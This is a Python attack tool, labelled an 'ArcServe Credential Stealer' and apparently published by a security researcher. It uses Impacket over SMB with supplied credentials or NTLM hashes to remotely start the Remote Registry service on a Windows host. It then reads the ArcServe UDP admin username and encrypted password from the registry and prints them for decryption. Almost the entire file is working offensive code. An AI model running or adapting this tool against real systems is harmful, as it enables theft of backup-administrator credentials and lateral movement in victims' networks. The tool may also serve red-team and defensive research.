#!/usr/bin/env python3

# Retrieve ArcServe admin credentials - Juan Manuel Fernandez (@TheXC3LL) - MDSec


import sys
import argparse
import logging
from impacket import system_errors
from impacket import version
from impacket.dcerpc.v5 import transport, scmr, rrp
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5.dtypes import NULL



# From Impacket Utils
def parse_target(target):
    domain, username, password, remote_name = target_regex.match(target).groups('')
    # In case the password contains '@'
    if '@' in remote_name:
        password = password + '@' + remote_name.rpartition('@')[0]
        remote_name = remote_name.rpartition('@')[2]
    return domain, username, password, remote_name


class giveme():
    def run(self, username,  password, domain, lmhash, nthash, doKerberos, dcHost, targetIp):
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % targetIp
        logging.debug('StringBinding %s' % stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(445)
        rpctransport.setRemoteHost(targetIp)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        dce = rpctransport.get_dce_rpc()
        print("[+] Connecting to %s" % targetIp)
        try:
            dce.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)
        dce.bind(scmr.MSRPC_UUID_SCMR)
        scHandle = scmr.hROpenSCManagerW(dce)
        serviceName = 'RemoteRegistry\x00'
        desiredAccess = scmr.SERVICE_START | scmr.SERVICE_STOP | scmr.SERVICE_CHANGE_CONFIG | scmr.SERVICE_QUERY_CONFIG | scmr.SERVICE_QUERY_STATUS | scmr.SERVICE_ENUMERATE_DEPENDENTS
        resp = scmr.hROpenServiceW(dce, scHandle['lpScHandle'], serviceName, desiredAccess )
        serviceHandle = resp['lpServiceHandle']
        print("[+] Checking Remote Registry service status...")
        resp = scmr.hRQueryServiceStatus(dce, serviceHandle)
        if resp['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            print("[+] Service is up!")
            stopme = False
        if resp['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            print("[+] Service is down!")
            stopme = True
        if stopme == True:
            print("[+] Starting Remote Registry service...")
            try:
               req = scmr.RStartServiceW()
               req['hService'] = serviceHandle
               req['argc'] = 0
               req['argv'] = NULL
               dce.request(req)
            except Exception as e:
               if str(e).find('ERROR_DEPENDENT_SERVICES_RUNNING') < 0 and str(e).find('ERROR_SERVICE_NOT_ACTIVE') < 0:
                  logging.critical(str(e))
                  raise
               pass
        strb = r'ncacn_np:%s[\pipe\winreg]' % targetIp
        rpc = transport.DCERPCTransportFactory(strb)
        rpc.set_dport(445)
        rpc.setRemoteHost(targetIp)
        if hasattr(rpc, 'set_credentials'):
            rpc.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
        if doKerberos:
            rpc.set_kerberos(doKerberos, kdcHost=dcHost)
        dce2 = rpc.get_dce_rpc()
        print("[+] Connecting to %s" % targetIp)
        try:
            dce2.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)
        dce2.bind(rrp.MSRPC_UUID_RRP)
        print("[+] Opening registry key")
        ans = rrp.hOpenLocalMachine(dce2)
        resp = rrp.hBaseRegOpenKey(dce2, ans["phKey"], "SOFTWARE\\Arcserve\\Unified Data Protection\\Engine", samDesired=rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE)
        handler = resp["phkResult"]
        type, adminuser = rrp.hBaseRegQueryValue(dce2, handler, "AdminUser")
        print("\t[*] User: " + adminuser)
        type, password = rrp.hBaseRegQueryValue(dce2, handler, "AdminPassword")
        password = password[0x80:]
        final = []
        for x in password:
            final.append(str(x))
        print("\t[*] Password: {" + ', '.join(final) + "}; // Paste it to the decrypter")
        if stopme == True:
            print("[+] Stopping Remote Registry Service")
            try:
               req = scmr.RControlService()
               req['hService'] = serviceHandle
               req['dwControl'] = scmr.SERVICE_CONTROL_STOP
               dce.request(req)
            except Exception as e:
               if str(e).find('ERROR_DEPENDENT_SERVICES_RUNNING') < 0 and str(e).find('ERROR_SERVICE_NOT_ACTIVE') < 0:
                   logging.critical(str(e))
                   raise
               pass


def main():
    parser = argparse.ArgumentParser(add_help = True, description = "ArcServe Credential Stealer - (@TheXC3LL) - MDSec")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')

    parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                        'cannot be found, it will use the ones specified in the command '
                        'line')
    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                        'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')

    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")

    pwn = giveme()
    pwn.run(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)


if __name__ == "__main__":
    print("\t\t-=[ ArcServe Credential Stealer - (@TheXC3LL) - MDSec]=-")
    main()
    print("\nHave a nice day! ^_^")
